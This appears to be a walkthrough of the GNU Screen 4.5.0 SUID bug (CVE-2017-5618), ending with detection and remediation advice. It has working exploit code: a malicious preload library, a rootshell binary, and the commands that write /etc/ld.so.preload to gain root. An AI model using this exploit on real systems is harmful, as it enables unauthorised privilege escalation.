## Vulnerable Services: Screen 4.5.0 (CVE-2017-5618)

GNU Screen version 4.5.0 contains a local privilege escalation vulnerability caused by improper permission checking when opening a log file.  Because `screen` carries the SUID bit, it runs as root for the log file operation, which allows an attacker to write to `/etc/ld.so.preload`, a system file that tells the dynamic linker which shared libraries to preload for every executing program. Controlling that file provides a system-wide code injection path that runs as root. 

Fixed in version 4.5.1. The fix adds a proper permission check before writing log files.

***

## Why This Works: ld.so.preload

`/etc/ld.so.preload` is read by the Linux dynamic linker before any program starts. Every entry in the file is loaded as a shared library before the program's own libraries.  Since this is a system-wide effect, any shared library listed there is loaded into every executing process, including those running as root. If you can write to this file (even as root, via the SUID screen bug), you can inject arbitrary code into every subsequent process. 

***

## Attack Walkthrough

### Step 1: Verify the vulnerable version

```bash
screen -v
# Screen version 4.05.00 (GNU) 10-Dec-16

# Confirm the SUID bit is set
ls -la $(which screen)
# -rwsr-xr-x 1 root root 1588768 /usr/bin/screen-4.5.0
```

### Step 2: Compile the malicious shared library

The shared library uses a constructor function, which runs automatically when the library is loaded. It uses `screen`'s root privileges to set the SUID bit on a shell binary and then removes the `ld.so.preload` entry to clean up after itself. 

```c
// /tmp/libhax.c
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <sys/stat.h>

__attribute__ ((__constructor__))
void dropshell(void) {
    chown("/tmp/rootshell", 0, 0);     // Set owner to root
    chmod("/tmp/rootshell", 04755);    // Set SUID + rwxr-xr-x
    unlink("/etc/ld.so.preload");      // Remove the preload entry (cleanup)
    printf("[+] done!\n");
}
```

```bash
gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

### Step 3: Compile the rootshell binary

This binary calls `setuid(0)` and spawns `/bin/sh`. Once the SUID bit is set on it by the constructor above, it gives an interactive root shell. 

```c
// /tmp/rootshell.c
#include <stdio.h>
int main(void) {
    setuid(0);
    setgid(0);
    seteuid(0);
    setegid(0);
    execvp("/bin/sh", NULL, NULL);
}
```

```bash
gcc -o /tmp/rootshell /tmp/rootshell.c -Wno-implicit-function-declaration
```

### Step 4: Write to /etc/ld.so.preload using screen's SUID

The `-L` flag in `screen` enables logging to a file. Without a path, it defaults to a file named `screenlog.N` in the current directory. By `cd`'ing to `/etc` first, the log file is created there. The `-D -m` flags start a detached session immediately, and the command `echo -ne "\x0a/tmp/libhax.so"` writes a newline followed by the path to the malicious library into the file.
```bash
cd /etc
umask 000
screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
```

### Step 5: Trigger library loading

Running `screen -ls` causes screen (running as SUID root) to execute, which causes the dynamic linker to read `/etc/ld.so.preload` and load `libhax.so`. The constructor function runs as root, setting the SUID bit on `/tmp/rootshell` and deleting the preload file.

```bash
screen -ls
# [+] done!
```

### Step 6: Execute the rootshell

```bash
/tmp/rootshell

id
# uid=0(root) gid=0(root) groups=0(root)
```

***

## Exploit Flow Summary

```
Low-priv user
    -> screen (SUID root) writes /etc/ld.so.preload
    -> ld.so.preload lists /tmp/libhax.so
    -> screen -ls triggers linker
    -> linker loads libhax.so as root
    -> constructor: chmod +s /tmp/rootshell
    -> /tmp/rootshell -> root shell
```

***

## Broader Context: ld.so.preload as an Attack Primitive

The Screen bug is one specific way to write to `/etc/ld.so.preload`, but the technique of injecting via this file appears in several other vulnerability classes.  Any bug that grants arbitrary file write as root, such as the CA Common Services `casrvc` binary (CVE-2016-9795) or other SUID binaries with log file misconfigurations, can be chained with the same shared library preload technique. The pattern is consistent: 

1. Find a primitive that lets you write content to `/etc/ld.so.preload`
2. Write the path to a malicious shared library
3. Trigger execution of any SUID binary
4. Linker loads your library as root, constructor function fires
5. Escalation completes

***

## Detection and Remediation

- Upgrade Screen to 4.5.1 or later, which adds a permissions check before writing log files 
- Monitor writes to `/etc/ld.so.preload` using auditd: `auditctl -w /etc/ld.so.preload -p wa -k ld_preload`
- Keep an inventory of all SUID binaries and review them after any package update
- Consider removing the SUID bit from screen entirely and granting access via sudo if root-level screen sessions are genuinely required
